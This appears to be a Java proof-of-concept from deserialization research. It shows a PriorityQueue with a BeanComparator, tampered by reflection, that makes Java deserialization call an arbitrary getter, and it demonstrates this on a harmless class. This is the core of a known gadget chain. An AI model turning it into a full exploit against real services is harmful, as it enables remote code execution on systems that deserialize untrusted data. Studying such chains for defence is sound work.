package com.xiinnn.readobject2getter;

import com.xiinnn.template.GetterClass;
import org.apache.commons.beanutils.BeanComparator;

import java.io.*;
import java.lang.reflect.Field;
import java.math.BigInteger;
import java.util.PriorityQueue;

// PriorityQueue#readObject -> getter
// 实测：jdk8u192 commons-beanutils#1.9.2
public class PriorityQueueReadObject2Getter {
    public static void main(String[] args) throws Exception{
        GetterClass getterClass = new GetterClass();

        final BeanComparator comparator = new BeanComparator("lowestSetBit");
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));
        // 这里设置要调用getter的属性名，此处演示调用getName
        setFieldValue(comparator, "property", "name");
        Field field = queue.getClass().getDeclaredField("queue");
        field.setAccessible(true);
        Object[] queueArray = (Object[]) field.get(queue);
        queueArray[0] = getterClass;
        queueArray[1] = getterClass;
        // 成功调用 GetterClass#getName
        byte[] bytes = serialize(queue);
        unserialize(bytes);
    }
    private static void setFieldValue(Object obj, String field, Object arg) throws Exception{
        Field f = obj.getClass().getDeclaredField(field);
        f.setAccessible(true);
        f.set(obj, arg);
    }
    public static byte[] serialize(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return baos.toByteArray();
    }
    public static void unserialize(byte[] bytes) throws IOException, ClassNotFoundException {
        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
    }
}
